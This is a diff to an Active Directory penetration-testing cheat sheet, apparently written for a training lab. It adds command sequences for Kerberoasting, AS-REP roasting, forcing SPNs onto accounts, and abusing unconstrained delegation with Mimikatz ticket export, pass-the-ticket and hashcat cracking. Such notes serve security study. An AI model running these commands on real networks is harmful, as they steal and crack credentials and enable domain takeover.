@@ -26,6 +26,11 @@
       * [SecurityDescriptor - WMI](#SecurityDescriptor---WMI)
       * [SecurityDescriptor - Powershell Remoting](#SecurityDescriptor---Powershell-Remoting)
       * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---Remote-Registry)
+* [Domain privilege escalation](#Domain-privilege escalation)
+   * [Kerberoast](#Kerberoast) 
+   * [AS-REPS](#AS-REPS) 
+   * [Set SPN](#Set-SPN) 
+   * [Unconstrained Delegation](#Unconstrained-delegation) 
       
 
 # General
@@ -710,30 +715,122 @@ Get-RemoteLocalAccountHash -Computername dcorp-dc -Verbose
 ```
 Get-RemoteCachedCredential -Computername dcorp-dc -Verbose
 ```
+# Domain Privilege escalation
+## Kerberoast
+#### Find user accounts used as service accounts
+```
+Get-NetUser -SPN
+```
+```
+. ./GetUserSPNs.ps1
+```
 
-####
+#### Reguest a TGS
+```
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
 ```
 
 ```
-
-####
+Request-SPNTicket 
 ```
 
+#### Export ticket using Mimikatz
+```
+Invoke-Mimikatz -Command '"Kerberos::list /export"'
 ```
 
-####
+#### Crack the ticket
+```
+python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
 ```
 
+## AS-REPS
+#### Enumerating accounts with kerberos preauth disabled
+```
+. .\Powerview_dev.ps1
+Get-DomainUser -PreauthNotRequired -Verbose
 ```
 
-####
+#### Enumerate permissions for the RDPusers
+```
+Invoke-ACLScanner -ResolveGUIDS | ?{$_.IdentityReference -match “RDPUsers”}
+Invoke-ACLScanner -ResolveGUIDS | ?{$_.IdentityReference -match “RDPUsers”} | select ObjectDN, ActiveDirectoryRights
 ```
 
+#### Request encrypted AS-REP
+```
+. ./ASREPRoast.ps1
+Get-ASREPHash -Username VPN1user -Verbose
 ```
 
-####
+#### Enumerate all users with kerberos preauth disabled and request a hash
+```
+Invoke-ASREPRoast -Verbose
 ```
 
+#### Crack the hash with hashcat
+Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
+```
+Hashcat -a 0 -m 18200 hash.txt rockyou.txt
+```
+
+## Set SPN
+#### Enumerate permissions for RDPusers on ACL
+```
+Invoke-ACLScanner -ResolveGUIDS | ?{$_.IdentityReference -match “RDPUsers”}
+Invoke-ACLScanner -ResolveGUIDS | ?{$_.IdentityReference -match “RDPUsers”} | select ObjectDN, ActiveDirectoryRights
+```
+
+#### Check if user has SPN
+```
+. ./Powerview_dev.ps1
+Get-DomainUser -Identity supportuser | select Serviceprincipalname
+Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
+```
+
+#### Set SPN for the user
+```
+Set-DomainObject -Identity support1user -Set @{serviceprincipalname=’ops/whatever1’}
+```
+
+#### Request a TGS
+```
+Add-Type -AssemblyName System.IdentityModel 
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
+```
+
+#### Export ticket to disk for offline cracking
+```
+Invoke-Mimikatz -Command ‘”Kerberos::list /export”’
+```
+
+#### Request TGS hash for offline cracking hashcat
+```
+Get-DomainUser -Identity support244user | Get-DomainSPNTicket | select -ExpandProperty Hash
+```
+
+## Unconstrained Delegation
+#### Discover domain computer which have unconstrained delegation
+DC always show up, ignore them
+```
+Get-Netcomputer -UnConstrained
+```
+
+#### Check if any DA tokens are available on the unconstrained machine
+Wait for a domain admin to login while checking for tokens
+```
+Invoke-Mimikatz -Command '"sekurlsa::tickets"'
+```
+
+#### Export the domain admin ticket
+```
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+```
+
+#### Reuse the DA ticket
+```
+Invoke-Mimikatz -Command '"Kerberos:ptt"' <kirbi file>
 ```
 
 ####
